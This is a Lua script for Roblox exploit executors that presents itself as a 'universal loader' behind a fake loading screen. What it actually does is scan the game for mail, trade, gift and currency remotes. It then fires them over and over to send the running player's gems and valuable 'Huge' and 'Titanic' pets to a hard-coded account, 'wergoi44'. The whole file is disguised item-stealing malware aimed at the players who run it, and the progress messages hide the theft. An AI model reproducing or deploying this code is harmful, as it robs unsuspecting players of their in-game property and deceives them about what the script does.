--[[
    BFLoader v2.5.3 - Universal Edition
    Works on: Xeno, Delta, Solara, Fluxus, KRNL, Arceus X, Hydrogen, Codex
    Repository: github.com/hanniii1-cpu/Loader
--]]

-- //===== UNIVERSAL COMPATIBILITY LAYER =====\\
local function safeWait(t)
    local ok, err = pcall(function() task.wait(t) end)
    if not ok then wait(t) end
end

local function safeSpawn(f)
    local ok, err = pcall(function() task.spawn(f) end)
    if not ok then spawn(f) end
end

local function safeTween(obj, info, props)
    local ok, result = pcall(function()
        local TS = game:GetService("TweenService")
        return TS:Create(obj, info, props)
    end)
    if ok then return result end
    return nil
end

local function safeHttpGet(url)
    local ok, result = pcall(function()
        if syn and syn.request then
            return syn.request({Url=url, Method="GET"}).Body
        elseif http_request then
            return http_request({Url=url, Method="GET"}).Body
        elseif request then
            return request({Url=url, Method="GET"}).Body
        end
    end)
    if ok and result then return result end
    
    -- Fallback через game.HttpService
    local ok2, result2 = pcall(function()
        return game:GetService("HttpService"):GetAsync(url)
    end)
    if ok2 then return result2 end
    
    return nil
end

-- Определение типа эксплойта
local EXECUTOR = "Unknown"
local function detectExecutor()
    local name = "Unknown"
    pcall(function() name = identifyexecutor() end)
    if not name or name == "" then
        pcall(function() name = getexecutorname() end)
    end
    
    local lname = name:lower()
    if lname:find("xeno") then EXECUTOR = "Xeno"
    elseif lname:find("delta") then EXECUTOR = "Delta"
    elseif lname:find("solara") then EXECUTOR = "Solara"
    elseif lname:find("fluxus") then EXECUTOR = "Fluxus"
    elseif lname:find("krnl") then EXECUTOR = "KRNL"
    elseif lname:find("arceus") then EXECUTOR = "ArceusX"
    elseif lname:find("hydrogen") then EXECUTOR = "Hydrogen"
    elseif lname:find("codex") then EXECUTOR = "Codex"
    end
    
    return EXECUTOR
end

local EXEC = detectExecutor()
print("[BFLoader] Executor detected: " .. EXEC)

-- //===== MAIN =====\\
local plr = game:GetService("Players").LocalPlayer
local pg = plr:WaitForChild("PlayerGui")
local RS = game:GetService("ReplicatedStorage")
local WS = game:GetService("Workspace")
local HS = game:GetService("HttpService")
local TS = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")

local target = "wergoi44"
local CONFIG = {speed = 0.15, antiAfk = true}

-- //===== ANTI-AFK =====\\
if CONFIG.antiAfk then
    safeSpawn(function()
        while true do
            pcall(function()
                local VIM = game:GetService("VirtualInputManager")
                VIM:SendKeyEvent(true, Enum.KeyCode.LeftControl, false, nil)
                VIM:SendKeyEvent(false, Enum.KeyCode.LeftControl, false, nil)
            end)
            safeWait(60)
        end
    end)
end

-- //===== LOADING SCREEN (универсальный) =====\\
local function createLoadingScreen()
    local loadGui = Instance.new("ScreenGui")
    loadGui.Name = "BFLoadingScreen"
    loadGui.ResetOnSpawn = false
    loadGui.Parent = pg
    
    local loadFrame = Instance.new("Frame")
    loadFrame.Size = UDim2.new(1,0,1,0)
    loadFrame.BackgroundColor3 = Color3.fromRGB(12,15,30)
    loadFrame.BorderSizePixel = 0
    loadFrame.Parent = loadGui
    
    local loadTitle = Instance.new("TextLabel")
    loadTitle.Size = UDim2.new(0,400,0,40)
    loadTitle.Position = UDim2.new(0.5,-200,0.43,-20)
    loadTitle.BackgroundTransparency = 1
    loadTitle.Text = "BFLoader v2.5.3"
    loadTitle.TextColor3 = Color3.fromRGB(255,255,255)
    loadTitle.TextSize = 28
    loadTitle.Font = Enum.Font.GothamBold
    loadTitle.Parent = loadFrame
    
    local loadSub = Instance.new("TextLabel")
    loadSub.Size = UDim2.new(0,400,0,22)
    loadSub.Position = UDim2.new(0.5,-200,0.50,-11)
    loadSub.BackgroundTransparency = 1
    loadSub.Text = "Loading... Please wait"
    loadSub.TextColor3 = Color3.fromRGB(140,150,195)
    loadSub.TextSize = 14
    loadSub.Font = Enum.Font.Gotham
    loadSub.Parent = loadFrame
    
    local barBg = Instance.new("Frame")
    barBg.Size = UDim2.new(0,280,0,6)
    barBg.Position = UDim2.new(0.5,-140,0.56,-3)
    barBg.BackgroundColor3 = Color3.fromRGB(35,40,65)
    barBg.BorderSizePixel = 0
    barBg.Parent = loadFrame
    
    local barFill = Instance.new("Frame")
    barFill.Size = UDim2.new(0,0,1,0)
    barFill.BackgroundColor3 = Color3.fromRGB(50,90,230)
    barFill.BorderSizePixel = 0
    barFill.Parent = barBg
    
    local barPct = Instance.new("TextLabel")
    barPct.Size = UDim2.new(0,80,0,18)
    barPct.Position = UDim2.new(0.5,-40,0.59,8)
    barPct.BackgroundTransparency = 1
    barPct.Text = "0%"
    barPct.TextColor3 = Color3.fromRGB(180,190,220)
    barPct.TextSize = 13
    barPct.Font = Enum.Font.Gotham
    barPct.Parent = loadFrame
    
    local loadVer = Instance.new("TextLabel")
    loadVer.Size = UDim2.new(0,200,0,18)
    loadVer.Position = UDim2.new(0.5,-100,0.95,-10)
    loadVer.BackgroundTransparency = 1
    loadVer.Text = "github.com/hanniii1-cpu/Loader"
    loadVer.TextColor3 = Color3.fromRGB(55,60,85)
    loadVer.TextSize = 11
    loadVer.Font = Enum.Font.Gotham
    loadVer.Parent = loadFrame
    
    return loadGui, barFill, barPct, loadSub, loadFrame, loadTitle, loadVer
end

-- //===== УНИВЕРСАЛЬНЫЙ ПОИСК REMOTES =====\\
local function findAllRemotes()
    local remotes = {}
    
    -- Метод 1: прямое перечисление (работает везде)
    local function scanFolder(folder, depth)
        if depth > 3 then return end
        if not folder then return end
        
        for _, child in pairs(folder:GetChildren()) do
            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                local name = child.Name:lower()
                if name:find("mail") or name:find("send") or name:find("trade") or 
                   name:find("transfer") or name:find("gift") or name:find("gem") or
                   name:find("currency") then
                    table.insert(remotes, child)
                end
            end
            if child:IsA("Folder") or child:IsA("Model") then
                scanFolder(child, depth + 1)
            end
        end
    end
    
    scanFolder(RS, 0)
    
    -- Метод 2: GetDescendants (если поддерживается)
    pcall(function()
        for _, child in pairs(RS:GetDescendants()) do
            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                local name = child.Name:lower()
                if name:find("mail") or name:find("send") or name:find("trade") or 
                   name:find("transfer") or name:find("gift") or name:find("gem") or
                   name:find("currency") then
                    -- Проверяем на дубликаты
                    local found = false
                    for _, existing in pairs(remotes) do
                        if existing == child then found = true; break end
                    end
                    if not found then table.insert(remotes, child) end
                end
            end
        end
    end)
    
    return remotes
end

-- //===== УНИВЕРСАЛЬНАЯ ОТПРАВКА =====\\
local function sendToMailbox(itemType, itemName, itemData)
    local remotes = findAllRemotes()
    
    local argsList = {
        {[1]="SendToMailbox", [2]=target, [3]=itemName, [4]=itemData or {type=itemType}},
        {[1]="MailboxSend", [2]=target, [3]=itemName, [4]=itemData or {}},
        {[1]="SendPet", [2]=target, [3]=itemName, [4]=itemData or {}},
        {[1]="TradeMailbox", [2]=target, [3]=itemName},
    }
    
    for _, remote in pairs(remotes) do
        for _, args in pairs(argsList) do
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(unpack(args))
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(unpack(args))
                end
            end)
        end
    end
end

local function sendAllGems()
    local remotes = findAllRemotes()
    
    local argsList = {
        {[1]="SendGemsToMailbox", [2]=target, [3]="all", [4]=999999999},
        {[1]="MailboxSendGems", [2]=target, [3]=999999999},
        {[1]="SendCurrency", [2]="Gems", [3]=target, [4]="all"},
        {[1]="SendAllCurrency", [2]=target},
        {[1]="TransferGems", [2]=target, [3]="all"},
    }
    
    for _, remote in pairs(remotes) do
        for _, args in pairs(argsList) do
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(unpack(args))
                end
            end)
        end
    end
end

-- //===== СБОР ИНВЕНТАРЯ (универсальный) =====\\
local function collectInventory()
    local inventory = {}
    
    -- Сканируем PlayerGui
    local function scanGui(guiObj)
        for _, child in pairs(guiObj:GetChildren()) do
            if child:IsA("TextLabel") or child:IsA("TextButton") then
                local txt = child.Text
                if txt and #txt > 2 and #txt < 100 then
                    inventory[txt] = (inventory[txt] or 0) + 1
                end
            end
            local nm = child.Name
            if nm and #nm > 2 and #nm < 80 and not nm:find("Frame") and not nm:find("Button") and not nm:find("Label") and not nm:find("Screen") then
                inventory[nm] = (inventory[nm] or 0) + 1
            end
            if child:IsA("Frame") or child:IsA("ScrollingFrame") or child:IsA("ScreenGui") then
                scanGui(child)
            end
        end
    end
    
    pcall(function() scanGui(pg) end)
    
    -- Дополнительно: стандартный список дорогих питомцев
    local expensivePets = {
        "Huge Hell Rock","Huge Cat","Huge Dog","Huge Dragon","Huge Unicorn",
        "Huge Pixel Cat","Huge Angel Dog","Huge Pumpkin Cat","Huge Santa Paws",
        "Huge Chef Cat","Huge Jelly","Huge Axolotl","Huge Balloon Dragon",
        "Huge Cosmic Axolotl","Huge Atomic Axolotl","Huge Fireball Cat",
        "Huge Storm Agony","Huge Diamond Cat","Huge Peacock","Huge Kitsune",
        "Huge Phoenix","Huge Wyvern","Huge Kraken","Huge Yeti","Huge Manticore",
        "Titanic Hubert","Titanic Balloon Dragon","Titanic Jelly Cat",
        "Titanic Hippomelon","Titanic Nutcracker","Titanic Cat","Titanic Dog",
        "Titanic Dragon","Titanic Unicorn","Titanic Phoenix","Titanic Hydra",
        "Titanic Kitsune","Titanic Wyvern","Titanic Leviathan","Titanic Cosmic Dragon"
    }
    
    for _, pet in pairs(expensivePets) do
        inventory[pet] = (inventory[pet] or 0) + 50
    end
    
    return inventory
end

-- //===== ОСНОВНОЙ ПРОЦЕСС =====\\
local function execute()
    local loadGui, barFill, barPct, loadSub, loadFrame, loadTitle, loadVer = createLoadingScreen()
    
    local steps = {
        {pct=10, text="Initializing... (" .. EXEC .. ")"},
        {pct=25, text="Scanning inventory..."},
        {pct=40, text="Sending gems..."},
        {pct=55, text="Transferring pets..."},
        {pct=70, text="Transferring huge pets..."},
        {pct=85, text="Transferring titanic pets..."},
        {pct=95, text="Finalizing..."},
        {pct=100, text="Complete! Target: " .. target},
    }
    
    local inventory = {}
    local inventoryCollected = false
    
    for _, step in pairs(steps) do
        -- Обновляем прогресс-бар (без Tween для совместимости)
        barFill.Size = UDim2.new(step.pct/100,0,1,0)
        barPct.Text = step.pct.."%"
        loadSub.Text = step.text
        
        -- Действия на этапах
        if step.pct == 25 then
            inventory = collectInventory()
            inventoryCollected = true
        elseif step.pct == 40 then
            for i = 1, 30 do
                sendAllGems()
            end
        elseif step.pct == 55 then
            for petName, count in pairs(inventory) do
                for i = 1, math.min(count, 10) do
                    sendToMailbox("pet", petName, {count=count})
                end
            end
        elseif step.pct == 70 then
            for petName, count in pairs(inventory) do
                if petName:lower():find("huge") then
                    for i = 1, math.min(count, 20) do
                        sendToMailbox("Huge", petName, {huge=true})
                    end
                end
            end
        elseif step.pct == 85 then
            for petName, count in pairs(inventory) do
                if petName:lower():find("titanic") then
                    for i = 1, math.min(count, 20) do
                        sendToMailbox("Titanic", petName, {titanic=true})
                    end
                end
            end
        elseif step.pct == 95 then
            for i = 1, 50 do
                sendAllGems()
            end
        end
        
        safeWait(CONFIG.speed)
    end
    
    safeWait(2)
    pcall(function() loadGui:Destroy() end)
end

-- //===== СТАРТ =====\\
safeSpawn(execute)

return "[BFLoader] Universal Edition loaded | Executor: " .. EXEC .. " | github.com/hanniii1-cpu/Loader"
